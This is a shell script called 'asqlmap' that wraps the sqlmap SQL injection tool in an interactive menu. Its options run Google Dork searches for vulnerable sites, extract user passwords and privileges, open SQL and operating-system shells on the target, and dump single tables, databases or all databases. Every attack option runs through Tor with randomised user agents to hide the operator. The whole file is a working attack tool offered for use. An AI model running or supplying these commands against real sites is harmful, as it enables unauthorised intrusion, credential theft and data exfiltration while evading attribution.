#!/bin/sh
	clear
	printf "**		Automated sqlmap (asqlmap) for BackBox v. 0.9.3 	  **\n"
	printf "   		           developed by Gualty    \n"
	printf "   		         http://github.com/Gualty    \n"
	printf "\n\nEach operation will be performed using the --tor flag for your anonymity"
	printf "\n		** Check that TOR and Polipo are running **\n"
	
	#Google Dork
	case $1 in
	-g) echo "\nATTENTION: Google Dork search will not use Tor.\nPress ENTER to continue at your own risk or CTRL+C to close asqlmap\n";read tasto;sqlmap -g $2 --random-agent -b --dbs --table;echo "Google Dork search done\n\nPress any key to close asqlmap";read tasto;exit;;
	esac
	#Check if the user specified an URL if is not a Google Dork search
	if [ -z "$1" ]
	then
		printf "\nNo URL specified. \nEg. ./asqlmap.sh http://www.example.com/index.php?id= \n\nPress any key to close asqlmap\n";read tasto;exit;
	fi
	# The options menu
	printf "\nURL: "; echo $1
	printf "\nWhat do you want to do?\n\n"

	printf "1) Vulnerability check and information research (Databases,tables)\n"
	printf "2) Users, passwords and privileges research\n"
	printf "3) Open SQL Shell\n"
	printf "4) Open OS Shell\n"
	printf "5) Dump single table\n"
	printf "6) Dump single database\n"
	printf "7) Dump all databases\n"
	printf "============================================================================\n"
	printf "8) Update to the latest GIT version of sqlmap\n"
	printf "9) Quit\n"
	printf "Choise: "
	read choice
	# Execute the right operation based on the choice of the user
	case "$choice" in
		1) sqlmap -u $1 --random-agent  -b --dbs --table --tor;echo "Vulnerability check done\n\nPress any key to continue";read tasto;$0 $1;;
		2) sqlmap -u $1 --random-agent  -b --users --passwords --privileges --tor;echo "\nRetrieving credentials and privileges done\n\nPress any key to continue";read tasto;$0 $1;;
		3) sqlmap -u $1 --random-agent  -b --sql-shell --tor;echo "\nSQL Shell closed\n\nPress any key to continue";read tasto;$0 $1;;
		4) sqlmap -u $1 --random-agent  -b --os-shell --tor;echo "\nOS Shell closed\n\nPress any key to continue";read tasto;$0 $1;;
		5) echo "\nTable name: "; read tabella; sqlmap -u $1 --random-agent -b --dump -T $tabella --tor;echo "\nDump of the table '$tabella' done\n\nPress any key to continuee";read tasto;$0 $1;;
		6) echo "\nDatabase name: "; read database; sqlmap -u $1 --random-agent -b --dump -D $database --tor;echo "\nDump of the database '$database' done\n\nPress any key to continue";read tasto;$0 $1;;
		7) sqlmap -u $1 --random-agent  -b --dump-all --tor;echo "\nDump of all databases done\n\nPress any key to continue";read tasto;$0 $1;;
		8) sudo sqlmap --update; echo "Update done\nPress any key to continue";read tasto;$0 $1;;
		9) echo "\nBye bye =)\n"; exit 0;;
		q) echo "\nBye bye =)\n"; exit 0;;
		*) echo "Not valid command\nPress any key to continue";read tasto;$0 $1;;
	esac
